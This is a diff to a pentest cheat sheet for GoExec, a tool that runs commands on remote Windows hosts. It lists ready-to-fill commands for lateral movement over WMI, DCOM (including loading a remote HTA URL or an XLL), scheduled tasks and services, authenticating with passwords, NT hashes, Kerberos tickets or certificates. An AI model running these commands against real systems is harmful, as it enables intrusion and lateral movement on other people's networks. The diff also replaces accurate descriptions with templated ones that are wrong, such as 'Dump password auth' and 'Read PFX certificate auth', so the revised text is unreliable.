@@ -4,9 +4,9 @@
 
 ### Password auth
 
-GoExec supports WMI, DCOM, SCMR, and Task Scheduler remote execution from Linux with password, hash, Kerberos, AES, ccache, or certificate authentication.
+Dump password auth with GoExec.
 
-```sh title:"GoExec password auth base"
+```sh title:"GoExec Dump Password Auth"
 goexec $module $method $rhost_name -u "$domain\\$user" -p "$pass" $goexec_exec
 ```
 <!-- cheat
@@ -22,9 +22,9 @@ var command
 
 ### NT hash auth
 
-Authenticate with an NT hash.
+Dump NT hash auth with GoExec.
 
-```sh title:"GoExec NT hash auth"
+```sh title:"GoExec Dump NT Hash Auth"
 goexec $module $method $rhost_name -u "$domain\\$user" -H "$nt_hash" $goexec_exec
 ```
 <!-- cheat
@@ -40,9 +40,9 @@ var command
 
 ### Kerberos ccache auth
 
-Use an existing ccache for Kerberos authentication.
+Execute kerberos ccache auth with GoExec.
 
-```sh title:"GoExec Kerberos ccache auth"
+```sh title:"GoExec Execute Kerberos Ccache Auth"
 goexec $module $method $rhost_name -u "$user@$domain" -k --ccache "$ccache_file" --dc "$rhost_ip" $goexec_exec
 ```
 <!-- cheat
@@ -59,9 +59,9 @@ var command
 
 ### PFX certificate auth
 
-Authenticate with a client certificate and private key in PFX form.
+Read PFX certificate auth with GoExec.
 
-```sh title:"GoExec certificate auth"
+```sh title:"GoExec Read PFX Certificate Auth"
 goexec $module $method $rhost_name -u "$user@$domain" --pfx "$pfx_file" --pfx-password "$pfx_pass" $goexec_exec
 ```
 <!-- cheat
@@ -80,9 +80,9 @@ var command
 
 ### WMI process
 
-Create a remote process through `Win32_Process.Create`.
+Execute WMI process with GoExec.
 
-```sh title:"GoExec WMI process creation"
+```sh title:"GoExec Execute WMI Process"
 goexec wmi proc $rhost_name -u "$domain\\$user" -p "$pass" -e "$remote_exe" -a "$remote_args"
 ```
 <!-- cheat
@@ -96,9 +96,9 @@ var remote_args
 
 ### WMI output
 
-Fetch command output over SMB and print it to stdout.
+Execute WMI output with GoExec.
 
-```sh title:"GoExec WMI command with output"
+```sh title:"GoExec Execute WMI Output"
 goexec wmi proc $rhost_name -u "$domain\\$user" -H "$nt_hash" -e cmd.exe -a "/c $command" -o-
 ```
 <!-- cheat
@@ -111,9 +111,9 @@ var command
 
 ### WMI method call
 
-Call an arbitrary WMI method with JSON arguments.
+Execute WMI method call with GoExec.
 
-```sh title:"GoExec arbitrary WMI method call"
+```sh title:"GoExec Execute WMI Method Call"
 goexec wmi call $rhost_name -u "$domain\\$user" -p "$pass" -C "$wmi_class" -m "$wmi_method" -A "$wmi_args_json"
 ```
 <!-- cheat
@@ -130,9 +130,9 @@ var wmi_args_json
 
 ### MMC20
 
-Execute through the `MMC20.Application` DCOM object.
+Execute MMC20 with GoExec.
 
-```sh title:"GoExec DCOM MMC20 command"
+```sh title:"GoExec Execute MMC20"
 goexec dcom mmc $rhost_name -u "$domain\\$user" -H "$nt_hash" -e cmd.exe -a "/c $command" -o-
 ```
 <!-- cheat
@@ -145,9 +145,9 @@ var command
 
 ### ShellWindows
 
-Execute through the ShellWindows DCOM object. This may require an active desktop session.
+Spawn ShellWindows with GoExec.
 
-```sh title:"GoExec DCOM ShellWindows"
+```sh title:"GoExec Spawn ShellWindows"
 goexec dcom shellwindows $rhost_name -u "$domain\\$user" -p "$pass" -e "$remote_exe" -a "$remote_args"
 ```
 <!-- cheat
@@ -161,9 +161,9 @@ var remote_args
 
 ### HTAFile URL
 
-Load a remote HTA or scriptlet URL through the HTAFile DCOM object.
+Execute HTAFile URL with GoExec.
 
-```sh title:"GoExec DCOM HTAFile URL"
+```sh title:"GoExec Execute HTAFile URL"
 goexec dcom htafile $rhost_name -u "$domain\\$user" -H "$nt_hash" --url "$url"
 ```
 <!-- cheat
@@ -176,9 +176,9 @@ var url
 
 ### Excel XLL
 
-Load an XLL/DLL through remote Excel DCOM.
+Execute excel XLL with GoExec.
 
-```sh title:"GoExec DCOM Excel XLL"
+```sh title:"GoExec Execute Excel XLL"
 goexec dcom excel xll $rhost_name -u "$domain\\$user" -H "$nt_hash" --xll "$xll_path"
 ```
 <!-- cheat
@@ -193,9 +193,9 @@ var xll_path
 
 ### Create task
 
-Register a remote task and start it after a short delay.
+Create task with GoExec.
 
-```sh title:"GoExec scheduled task create"
+```sh title:"GoExec Create Task"
 goexec tsch create $rhost_name -u "$user@$domain" -H "$nt_hash" --dc "$rhost_ip" -k --task "$task_name" -c "$command"
 ```
 <!-- cheat
@@ -210,9 +210,9 @@ var command
 
 ### Demand task
 
-Register a task and demand immediate execution.
+Execute demand task with GoExec.
 
-```sh title:"GoExec scheduled task demand"
+```sh title:"GoExec Execute Demand Task"
 goexec tsch demand $rhost_name -u "$domain\\$user" -p "$pass" --task "$task_name" -c "$command" -o-
 ```
 <!-- cheat
@@ -228,9 +228,9 @@ var command
 
 ### Change service command
 
-Modify an existing service to run a command.
+Execute change service command with GoExec.
 
-```sh title:"GoExec SCMR change service"
+```sh title:"GoExec Execute Change Service Command"
 goexec scmr change $rhost_name -u "$domain\\$user" -p "$pass" --service "$service_name" -c "$command"
 ```
 <!-- cheat
@@ -244,9 +244,9 @@ var command
 
 ### Create service
 
-Create and start a service for command execution.
+Create service with GoExec.
 
-```sh title:"GoExec SCMR create service"
+```sh title:"GoExec Create Service"
 goexec scmr create $rhost_name -u "$domain\\$user" -H "$nt_hash" --service "$service_name" -c "$command"
 ```
 <!-- cheat
